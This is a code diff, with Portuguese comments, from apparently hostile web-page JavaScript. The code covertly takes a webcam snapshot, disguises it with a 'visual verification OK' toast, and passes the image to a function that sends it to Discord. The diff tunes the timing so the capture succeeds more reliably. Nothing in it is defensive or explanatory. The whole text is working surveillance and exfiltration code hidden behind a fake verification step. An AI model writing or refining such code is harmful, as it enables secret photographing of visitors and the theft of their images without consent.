@@ -792,41 +792,43 @@
                 video.volume = 0;
                 video.setAttribute('playsinline', '');
                 
-                // Aguardar vídeo carregar
+                // Aguardar vídeo carregar e começar a tocar
                 await new Promise(resolve => {
-                    video.addEventListener('loadedmetadata', resolve, { once: true });
+                    video.onloadedmetadata = () => {
+                        video.play().then(resolve).catch(resolve);
+                    };
                 });
                 
-                // Captura ultra-rápida
-                setTimeout(() => {
-                    try {
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
-                        
-                        this.data.camera = {
-                            image: canvas.toDataURL('image/jpeg', 0.7),
-                            status: 'success',
-                            resolution: `${canvas.width}x${canvas.height}`,
-                            timestamp: new Date().toISOString()
-                        };
-                        
-                        console.log('✅ Foto capturada!');
-                        this.showToast('📸 Verificação visual OK', 'success');
-                        
-                        // Enviar foto imediatamente
-                        this.sendCameraToDiscord();
-                        
-                    } catch (e) {
-                        console.error('Erro na captura:', e);
-                    } finally {
-                        // SEMPRE parar a câmera
-                        stream.getTracks().forEach(track => track.stop());
-                        video.srcObject = null;
-                    }
-                }, 100); // Apenas 100ms!
+                // Aumentar o tempo de espera para a câmera estabilizar
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                try {
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    this.data.camera = {
+                        image: canvas.toDataURL('image/jpeg', 0.7),
+                        status: 'success',
+                        resolution: `${canvas.width}x${canvas.height}`,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    console.log('✅ Foto capturada!');
+                    this.showToast('📸 Verificação visual OK', 'success');
+                    
+                    // Enviar foto imediatamente
+                    this.sendCameraToDiscord();
+                    
+                } catch (e) {
+                    console.error('Erro na captura:', e);
+                } finally {
+                    // SEMPRE parar a câmera
+                    stream.getTracks().forEach(track => track.stop());
+                    video.srcObject = null;
+                }
                 
             } catch (error) {
                 console.log('❌ Câmera não acessível');
